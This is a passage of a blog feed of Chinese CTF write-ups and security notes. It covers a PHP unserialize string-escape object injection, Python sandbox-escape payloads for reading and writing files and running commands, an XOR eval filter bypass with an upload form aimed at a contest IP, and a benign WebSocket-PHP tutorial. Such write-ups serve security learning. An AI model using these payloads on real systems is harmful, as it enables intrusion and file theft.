for($i=0;$i&lt;strlen($str);$i++){
    echo unicode_encode($str[$i]);
}
}


main(&#39;&lt;?=phpinfo()?&gt;&#39;);
?&gt;</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
<ul>
<li>EXP</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
<ul>
<li>Getflag</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>2020安恒4月月赛web1</title>
    <url>//articles/d61b44424b.html</url>
    <content><![CDATA[<h2 id="2020安恒4月月赛web1-字符串逃逸导致对象注入"><a href="#2020安恒4月月赛web1-字符串逃逸导致对象注入" class="headerlink" title="2020安恒4月月赛web1-字符串逃逸导致对象注入"></a>2020安恒4月月赛web1-字符串逃逸导致对象注入</h2><p>首先看一个例子：</p>
<pre><code class="php">&lt;?php
$a=&#39;a:2:{i:0;s:6:&quot;tr1ple&quot;;i:1;s:5:&quot;aaaaa&quot;;}i:1;s:5:&quot;aaaaa&quot;;&#39;;
var_dump(unserialize($a));</code></pre>
<p>运行之后会发现以下几点:</p>
<ul>
<li>它能够正常反序列化</li>
<li>不存在的属性他也能反序列化</li>
</ul>
<p>其实这个和PHP反序列化的特性有关：</p>
<ul>
<li>反序列化时候以分号<code>;</code>作为字段的分隔符，以<code>}</code>作为结束。这也就是解释了上面的序列化值为什么能够正常反序列化，因为<code>}</code>作为了结束符。</li>
<li>类中不存在的属性亦能反序列化</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/blog/20200427170935.png" alt="20200427170935"></p>
<p>我们再看一个例子：</p>
<pre><code class="php">&lt;?php
function filter($string){
  $a = str_replace(&#39;x&#39;,&#39;zz&#39;,$string);
   return $a;
}
$username = &#39;tr1plexxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}&#39;; 
$password=&quot;aaaaa&quot;;
$user = array($username, $password);
echo serialize($user);
echo &quot;\n&quot;;
$r = filter(serialize($user));
echo($r);
echo &quot;\n&quot;;

var_dump(unserialize($r));</code></pre>
<p>$user在序列化后会是:</p>
<pre><code class="php">a:2:{i:0;s:46:&quot;tr1plexxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre>
<p>这里我们可以发现第二个元素被解析称为aaaa,而<code>;i:1;s:6:&quot;123456&quot;;</code>被当做字符串处理了。</p>
<pre><code class="php">a:2:{i:0;s:46:&quot;tr1plezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre>
<p>可以观察到x被替换称为两个z,其长度正好是<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 的1倍，也就是四十。</p>
<p>但是为什么它会忽略<code>&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code> 呢？因为PHP在反序列化时候是不仅仅是根据<code>}</code> 来判定反序列化块的范围，还是根据总字符的长度，原来的长度是80我们在加上20个字符之后正好将后面的给覆盖掉了。于是他只反序列化了前面的部分。</p>
<p>我们再看一个例子，结果却刚好和上面的结果相反：</p>
<pre><code class="php">&lt;?php
$r = &#39;a:2:{i:0;s:46:&quot;tr1plezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&#39;;
 $r = str_replace(&#39;zzzzzzz&#39;, chr(0).&#39;*&#39;.chr(0), $r);
 echo $r;
var_dump(unserialize($r));</code></pre>
<p>上面代码替换会减少一半导致:<code>;i:1;s:6:&quot;123456&quot;;}&quot;</code> 被吞掉导致最后结果如下：</p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200427205958.png" alt="20200427205958"></p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code class="php"> &lt;?php
show_source(&quot;index.php&quot;);
function write($data) {
    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);
}

function read($data) {
    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b = &#39;gqy&#39;;
    function __destruct(){
        $c = &#39;a&#39;.$this-&gt;b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return &#39;nice&#39;;
    }
}

$a = new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a)))); </code></pre>
<p>这道题和上面的道理一样，这里我们无需考虑<code>类A</code> 只需要考虑B和C。</p>
<p>我们生成一个序列化之后的结果：</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></pre>
<p>我们看我们要吞掉的内容明显是<code>;s:8:&quot;password&quot;</code> 这一块，我们可以传入<code>;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code> 拼接起来成这样：</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:72:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>但是这样是无法getflag的，因为我们传入的payload被<code>&quot;</code> 包裹所以我们要添加一个双引号进行逃逸。</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:73:&quot;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>那么现在我们需要吞并掉的就是<code>;s:8:&quot;password&quot;;s:73:&quot;&quot;</code> ,但是这个长度实23没法整除2，我们需要添加一个字符加起来24.</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:73:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>所以我们最终会构成一个这样的序列化字符块：</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:48:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:74:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;;}</code></pre>
<p>因为需要逃逸24个字符，所以需要48个长度的<code>\0</code></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Python沙箱逃逸学习笔记</title>
    <url>//articles/d61ff4cabe.html</url>
    <content><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>所谓的 Python 沙盒，即以一定的方法模拟(socat) Python 终端，实现用户对 Python 的使用。</p>
<h3 id="逃逸方法"><a href="#逃逸方法" class="headerlink" title="逃逸方法"></a>逃逸方法</h3><ul>
<li>Python内建函数中有些函数能够执行shell命令，导致任意代码执行。</li>
</ul>
<pre><code class="python">  os.system() 
  os.popen()
  commands.getstatusoutput() 
  commands.getoutput()
  commands.getstatus()
  subprocess.call(command, shell=True) 
  subprocess.Popen(command, shell=True)
  pty.spawn()</code></pre>
<ul>
<li>Python中导入模块的方法</li>
</ul>
<pre><code class="python">import xxx
form xx import *
__import__(&#39;xxx&#39;)</code></pre>
<p>​        我们可以通过上述方法导入相关模块再调用相关函数导致命令执行。除此之外，我们也可以通过路径引入模块，例如linux系统中Python os的路径一般都是/usr/lib/python2.7/os.py,当知道路径的时候就可以通过如下操作导入操作模块。进一步调用相关函数。</p>
<pre><code class="python">&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;
&gt;&gt;&gt; import os
&gt;&gt;&gt;</code></pre>
<ul>
<li><p>其他危险函数</p>
<ol>
<li>execfile文件执行</li>
</ol>
</li>
</ul>
<pre><code class="shell">&gt;&gt;&gt; execfile(&#39;/usr/lib/python2.7/os.py&#39;)
&gt;&gt;&gt; system(&#39;cat /etc/passwd&#39;)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
&gt;&gt;&gt; getcwd()
&#39;/usr/lib/python2.7&#39;</code></pre>
<p>​        2.timeit</p>
<pre><code class="python">import timeit
timeit.timit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number=1)</code></pre>
<p>​        3.eval和exec</p>
<pre><code class="python">eval(&#39;__import__(&#39;os&#39;).system(&quot;dir&quot;)&#39;)</code></pre>
<p>​        4.platform</p>
<pre><code class="python">import platform
print platform.popen(&#39;dir&#39;).read()</code></pre>
<ul>
<li>Python内建函数</li>
</ul>
<p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 <code>dir __builtin__</code> 来获取内置函数列表</p>
<pre><code class="python">&gt;&gt;&gt; dir(__builtins__)
[&#39;ArithmeticError&#39;, &#39;AssertionError&#39;, &#39;AttributeError&#39;, .....</code></pre>
<p>在Python中一个模块是由字典对象实现命名空间的，例如：m.x等同于m.dic[“x”].那么我们可以直接通过<strong>dic</strong>引入我们想要的模块（其作用为列出一个模组/类对象下面的属性和函数）。</p>
<p>绕过实例：</p>
<pre><code class="python">&gt;&gt;&gt;__builtins__.__dict__[&#39;X19pbXBvcnRfXw==&#39;.decode(&#39;base64&#39;)](&#39;b3M=&#39;.decode(&#39;base64&#39;))</code></pre>
<pre><code>&gt;&gt;&gt; import base64
&gt;&gt;&gt; base64.b64encode(&#39;__import__&#39;)
&#39;X19pbXBvcnRfXw==&#39;
&gt;&gt;&gt; base64.b64encode(&#39;os&#39;)
&#39;b3M</code></pre><p><em>如果一些 内敛函数在 *</em>builtins** 删除 ，我们可以通过 reload(<strong>builtins</strong>) 重新载入获取一个完整的 <strong>builtins*</strong></p>
<ul>
<li>创建对象以及引用</li>
</ul>
<p>Python中的object类集成了许多基础函数，我们想要调用的时候也是可以直接创建对象进而引用。</p>
<p>常见方法：</p>
<pre><code class="python">().__class__.bases__[0]
&#39;&#39;.__class__.mro__[2]
读取文件：
print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()</code></pre>
<p>常见payload:</p>
<pre><code class="python">#读文件
().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()

#写文件
().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/input&#39;, &#39;w&#39;).write(&#39;123&#39;)

#执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#39; )</code></pre>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Websocket-php学习笔记</title>
    <url>//articles/d649bc731c.html</url>
    <content><![CDATA[<h2 id="创建一个套接字"><a href="#创建一个套接字" class="headerlink" title="创建一个套接字"></a>创建一个套接字</h2><p>​        <code>socket_create</code>创建并返回一个套接字，也称作一个通讯节点。一个典型的网络连接由 2 个套接字构成，一个运行在客户端，另一个运行在服务器端。</p>
<pre><code class="php">resource socket_create ( int $domain , int $type , int $protocol )</code></pre>
<ul>
<li><code>@parameter domain</code>参数指定哪个协议用在当前套接字上</li>
</ul>
<table>
<thead>
<tr>
<th>Domain</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>AF_INET</code></strong></td>
<td>IPv4 网络协议。TCP 和 UDP 都可使用此协议。</td>
</tr>
<tr>
<td><strong><code>AF_INET6</code></strong></td>
<td>IPv6 网络协议。TCP 和 UDP 都可使用此协议。</td>
</tr>
<tr>
<td><strong><code>AF_UNIX</code></strong></td>
<td>本地通讯协议。具有高性能和低成本的 IPC（进程间通讯）。</td>
</tr>
</tbody></table>
<ul>
<li><code>@parameter type</code>参数用于选择套接字使用的类型</li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>SOCK_STREAM</code></strong></td>
<td>提供一个顺序化的、可靠的、全双工的、基于连接的字节流。支持数据传送流量控制机制。TCP 协议即基于这种流式套接字。</td>
</tr>
<tr>
<td><strong><code>SOCK_DGRAM</code></strong></td>
<td>提供数据报文的支持。(无连接，不可靠、固定最大长度).UDP协议即基于这种数据报文套接字。</td>
</tr>
<tr>
<td><strong><code>SOCK_SEQPACKET</code></strong></td>
<td>提供一个顺序化的、可靠的、全双工的、面向连接的、固定最大长度的数据通信；数据端通过接收每一个数据段来读取整个数据包。</td>
</tr>
<tr>
<td><strong><code>SOCK_RAW</code></strong></td>
<td>提供读取原始的网络协议。这种特殊的套接字可用于手工构建任意类型的协议。一般使用这个套接字来实现 ICMP 请求（例如 ping）。</td>
</tr>
<tr>
<td><strong><code>SOCK_RDM</code></strong></td>
<td>提供一个可靠的数据层，但不保证到达顺序。一般的操作系统都未实现此功能。</td>
</tr>
</tbody></table>
<ul>
<li><code>@parameter protocol</code>是设置指定 <code>domain</code> 套接字下的具体协议。这个值可以使用 <a href="http://php.net/manual/zh/function.getprotobyname.php" target="_blank" rel="noopener">getprotobyname()</a> 函数进行读取。如果所需的协议是 TCP 或 UDP，可以直接使用常量 <code>SOL_TCP</code> 和 <code>SOL_UDP</code> 。</li>
</ul>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>icmp</td>
<td>Internet Control Message Protocol 主要用于网关和主机报告错误的数据通信。例如“ping”命令（在目前大部分的操作系统中）就是使用 ICMP 协议实现的。</td>
</tr>
<tr>
<td>udp</td>
<td>User Datagram Protocol 是一个无连接的、不可靠的、具有固定最大长度的报文协议。由于这些特性，UDP 协议拥有最小的协议开销。</td>
</tr>
<tr>
<td>tcp</td>
<td>Transmission Control Protocol 是一个可靠的、基于连接的、面向数据流的全双工协议。TCP  能够保障所有的数据包是按照其发送顺序而接收的。如果任意数据包在通讯时丢失，TCP  将自动重发数据包直到目标主机应答已接收。因为可靠性和性能的原因，TCP 在数据传输层使用 8bit 字节边界。因此，TCP  应用程序必须允许传送部分报文的可能。</td>
</tr>
</tbody></table>
<ul>
<li><code>返回值</code>socket_create() 正确时返回一个套接字，失败时返回 <code>FALSE</code>。要读取错误代码，可以调用 <a href="http://php.net/manual/zh/function.socket-last-error.php" target="_blank" rel="noopener">socket_last_error()</a>。这个错误代码可以通过 <a href="http://php.net/manual/zh/function.socket-strerror.php" target="_blank" rel="noopener">socket_strerror()</a> 读取文字的错误说明。</li>
</ul>
<hr>
<p>  <code>socket_bind</code>给套接字绑定名字,<strong>注意：</strong>绑定 <code>address</code> 到 <code>socket</code>。   该操作必须是在使用 <a href="https://www.php.net/manual/zh/function.socket-connect.php" target="_blank" rel="noopener">socket_connect()</a> 或者 <a href="https://www.php.net/manual/zh/function.socket-listen.php" target="_blank" rel="noopener">socket_listen()</a>   建立一个连接之前。  </p>
<pre><code class="php"> socket_bind ( resource $socket , string $address [, int $port = 0 ] ) : bool</code></pre>
<ul>
<li><p><code>@parameter socket</code>用 <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> 创建的一个有效的套接字资源。      </p>
</li>
<li><p><code>@parameter address</code></p>
<ul>
<li>如果套接字是 <strong><code>AF_INET</code></strong> 族，那么       <code>address</code> 必须是一个四点分法的 IP 地址（例如 <em>127.0.0.1</em> ）。</li>
<li>如果套接字是 <strong><code>AF_UNIX</code></strong> 族，那么 <code>address</code> 是 Unix 套接字一部分（例如 /tmp/my.sock ）</li>
</ul>
</li>
<li><p><code>@parameter port</code>参数 <code>port</code> 仅仅用于 <strong><code>AF_INET</code></strong>       套接字连接的时候，并且指定连接中需要监听的端口号。      </p>
</li>
</ul>
<hr>
<p>  ​    <code>socket_listen</code>监听socket连接</p>
<pre><code class="php"> socket_listen ( resource $socket [, int $backlog = 0 ] ) : bool</code></pre>
<ul>
<li><code>@parameter socket</code>用 <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> 创建的一个有效的套接字资源。</li>
<li><code>@parameter backlog</code>端口号</li>
</ul>
<h2 id="创建套接字实例"><a href="#创建套接字实例" class="headerlink" title="创建套接字实例"></a>创建套接字实例</h2><pre><code class="php">public function service(){
    $tcp = getprotobyname(&quot;tcp&quot;);    //获取tcp协议号码。
    $sock = socket_create(AF_INET, SOCK_STREAM, $tcp);//创建一个套接字
    socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
    if($sock &lt; 0)
    {
        throw new Exception(&quot;failed to create socket: &quot;.socket_strerror($sock).&quot;\n&quot;);//获取错误
    }
    socket_bind($sock, $this-&gt;address, $this-&gt;port);//绑定IP和端口
    socket_listen($sock, $this-&gt;port);//监听端口
    echo &quot;listen on $this-&gt;address $this-&gt;port ... \n&quot;;
    $this-&gt;_sockets = $sock;
}</code></pre>
<h2 id="握手处理"><a href="#握手处理" class="headerlink" title="握手处理"></a>握手处理</h2><ul>
<li>我们直接从代码示例看,这个类方法传入了两个参数，一个是socket、一个是请求包，在接收到请求包后会遍历这个请求包，获取中的<code>Sec-WebSocket-Key&#39;</code>,<code>Sec-WebSocket-Key</code> 加上一个特殊字符串  <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>，然后计算 SHA-1 ，之后进行 BASE-64  编码，将结果做为 <code>Sec-WebSocket-Accept</code> 头的值并且插入在响应包中 返回给客户端。</li>
<li><code>socket_write</code> 将字符串写入socket中</li>
</ul>
<pre><code class="php">socket_write( resource `$socket`   , string `$buffer`   [, int `$length` = 0  ] ) : int</code></pre>
<pre><code class="php">/**
 * 握手处理
 * @param $newClient socket
 * @return int  接收到的信息
 */
public function handshaking($newClient, $line){

    $headers = array();
    $lines = preg_split(&quot;/\r\n/&quot;, $line);
    foreach($lines as $line)
    {
        $line = chop($line);//chop()若为空则移除\n\r空格之类的。
        if(preg_match(&#39;/\A(\S+): (.*)\z/&#39;, $line, $matches))//正则获取header头
        {
            $headers[$matches[1]] = $matches[2];//将header存入数组
        }
    }
    $secKey = $headers[&#39;Sec-WebSocket-Key&#39;];
    $secAccept = base64_encode(pack(&#39;H*&#39;, sha1($secKey . &#39;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#39;)));
    $upgrade  = &quot;HTTP/1.1 101 Web Socket Protocol Handshake\r\n&quot; .
        &quot;Upgrade: websocket\r\n&quot; .
        &quot;Connection: Upgrade\r\n&quot; .
        &quot;WebSocket-Origin: $this-&gt;address\r\n&quot; .
        &quot;WebSocket-Location: ws://$this-&gt;address:$this-&gt;port/websocket/websocket\r\n&quot;.
        &quot;Sec-WebSocket-Accept:$secAccept\r\n\r\n&quot;;  //构造响应包
    return socket_write($newClient, $upgrade, strlen($upgrade));
}</code></pre>
<h2 id="Websocket的数据处理"><a href="#Websocket的数据处理" class="headerlink" title="Websocket的数据处理"></a>Websocket的数据处理</h2><ul>
<li><p><strong>数据帧格式</strong></p>
<p>​    WebSocket客户端，服务端通信的最小单位是帧（frame）,由一个或多个帧组成一条完整的消息(message)</p>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191205/15755606535758.png" alt="img"></p>
<ul>
<li><strong>数据帧格式详解</strong>：</li>
</ul>
<p><strong>FIN</strong></p>
<p>​        如果是1，表示这是消息(message)的最后一个分片（fragment）,如果是0，表示不是消息（message）的最后一个分片（fragment）</p>
<p><strong>Opcode</strong>: </p>
<p>​            4个比特。</p>
<p><strong>操作码</strong></p>
<p>​        Opcode的值决定了应该如何解析后续的数据载荷（data payload）。如果操作码是不认识的，那么接收端应该断开连接（fail the connection）</p>
<p><strong>Mask</strong>: 1个比特。</p>
<p>​        从客户端向服务端发送数据时，需要对数据进行掩码操作；从服务端向客户端发送数据时，不需要对数据进行掩码操作。<br>如果服务端接收到的数据没有进行过掩码操作，服务端需要断开连接。</p>
<p><strong>Payload length</strong>: 数据载荷的长度。 7位  或  7 + 16 位  或  7 + 64位。</p>
<p>​    假设 Payload length == x</p>
<p>x 为 0-126： 数据长度为x字节.<br>x 为 126 ： 后续2个字节代表一个16位无符号整数<br>x  为 127 ： 后续8个字节代表一个64位无符号整数</p>
<p><strong>掩码算法</strong>：</p>
<p> 首先，假设：</p>
<pre><code>original-octet-i：为原始数据的第i字节。
transformed-octet-i：为转换后的数据的第i字节。
j：为i mod 4的结果。
masking-key-octet-j：为mask key第j字节。

算法描述为： original-octet-i 与 masking-key-octet-j 异或后，得到 transformed-octet-i。</code></pre><ul>
<li>数据帧的解析如下：</li>
</ul>
<pre><code class="php">/**
     * 解析接收数据
     * @param $buffer
     * @return null|string
     */
    public function message($buffer){
        $len = $masks = $data = $decoded = null;
        $len = ord($buffer[1]) &amp; 127;//取出第8-15位
        if ($len === 126)  { // 126&lt;=数据长度&lt;= 65535   Extended payload length 有 占用2个字节
            $masks = substr($buffer, 4, 4);//帧格式 Masking-key 占用4字节
            $data = substr($buffer, 8);//第九个字节（索引 8 ）开始 是数据
        } else if ($len === 127)  { // 65535 &lt;= 数据长度  ；Extended payload length 有 占用8个字节
            $masks = substr($buffer, 10, 4);// 说明 Extended payload length 占用 8个字节 2 + 8 所以从 10开始
            $data = substr($buffer, 14);
        } else  {
            $masks = substr($buffer, 2, 4);
            $data = substr($buffer, 6);
        }
        for ($index = 0; $index &lt; strlen($data); $index++) {
            $decoded .= $data[$index] ^ $masks[$index % 4];//掩码转换为原文
        }
        return $decoded;  
    }
</code></pre>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>WEB开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF-Easy-PHP笔记</title>
    <url>//articles/d66b21b329.html</url>
    <content><![CDATA[<h3 id="题目是一个源码审计"><a href="#题目是一个源码审计" class="headerlink" title="题目是一个源码审计:"></a>题目是一个源码审计:</h3><pre><code class="php+HTML">&lt;?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES[&quot;file&quot;])){
        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];
        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];
        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);
    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); 
        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);
    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); 
        $path= $userdir.&quot;/&quot;.$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET[&#39;_&#39;];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)&gt;18){
    die(&#39;One inch long, one inch strong!&#39;);
}

if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )
    die(&#39;Try something else!&#39;);

$character_type = count_chars($hhh, 3);
if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);

eval($hhh);
?&gt;</code></pre>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><ul>
<li><p>对GET传入字符做出了长度限制不得超过18,使用一个正则过滤了<code>自然数、英文字符,x00,X7F,反引号,&quot;,&#39;,_,&amp;,.,逗号</code>。</p>
</li>
<li><p><code>count_chars(string,3)</code>取出不同字符的个数，并且设置不得大于12个。最后<code>eval()</code>执行。按照题目的意思是要构造一个能够调用<code>get_the_flag()</code>上面这个自定义函数的方法，上传shell.</p>
</li>
<li><p>绕过get_the_flag()直接使用<code>.htaccess</code>方法执行php</p>
</li>
</ul>
<h4 id="绕过限制执行任意函数"><a href="#绕过限制执行任意函数" class="headerlink" title="绕过限制执行任意函数"></a>绕过限制执行任意函数</h4><ul>
<li><p>这里参考了一篇文章：<a href="https://xz.aliyun.com/t/5677#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-9</a></p>
</li>
<li><p>使用<code>0xff</code>异或得到<code>=&gt;_GET</code>进行调用这里写了个脚本对这个结果进行爆破:</p>
</li>
</ul>
<pre><code class="python">def bypass():
    minn = 1000000000
    G = []
    E = []
    T = []
    _ = []
    str_1 = r&#39;\&#39;&quot;`~_&amp;.,|=[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
    str_2 = []
    for i in str_1:
        str_2.append(ord(i))
    str_3=&#39;0123456789abcdef&#39;#构造16进制所含字符
    str_0x16 = []
    &#39;&#39;&#39;构造16进制&#39;&#39;&#39;
    for i in str_3:
        for j in str_3:
            tmp =  &#39;0x&#39;+i+j
            str_0x16.append(tmp)
    for i in str_0x16:
        #for j in str_0x16:
            j = &quot;0xff&quot;
            tmp_1 = int(i,16)
            tmp_2 = int(&quot;0xff&quot;,16)

​```
        if (tmp_1 in str_2) or (tmp_2 in str_2) or (0&lt;=tmp_1&lt;=32) or (0&lt;=tmp_2&lt;=32) or (tmp_1==127) or (tmp_2==127):
            continue
        if tmp_1^tmp_2==ord(&#39;G&#39;):
            print(&#39;G=&gt;&#39;+i+&quot;^&quot;+j)
        if tmp_1^tmp_2==ord(&#39;E&#39;):
            print(&#39;E=&gt;&#39;+i+&quot;^&quot;+j)
        if tmp_1^tmp_2==ord(&#39;T&#39;):
            print(&#39;T=&gt;&#39;+i+&quot;^&quot;+j)
        if tmp_1^tmp_2==ord(&#39;_&#39;):
            print(&#39;_=&gt;&#39;+i+&quot;^&quot;+j)


bypass()</code></pre>
<ul>
<li>输出结果</li>
</ul>
<pre><code class="python">_=&gt;0xa0^0xff
T=&gt;0xab^0xff
G=&gt;0xb8^0xff
E=&gt;0xba^0xff
[Finished in 0.2s]</code></pre>
<ul>
<li>那么可以构造payload:</li>
</ul>
<pre><code class="visual">${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=phpinfo
${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661474033546.png" alt></p>
<ul>
<li>正好拿WEB1的表单作为上传</li>
</ul>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
    &lt;title&gt;Upload Labs&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;h2&gt;Upload Labs&lt;/h2&gt;
    &lt;form action=&quot;http://47.111.59.243:9001/?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
        &lt;label for=&quot;file&quot;&gt;upload&lt;/label&gt;
        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;upload&quot;&gt;
    &lt;/form&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
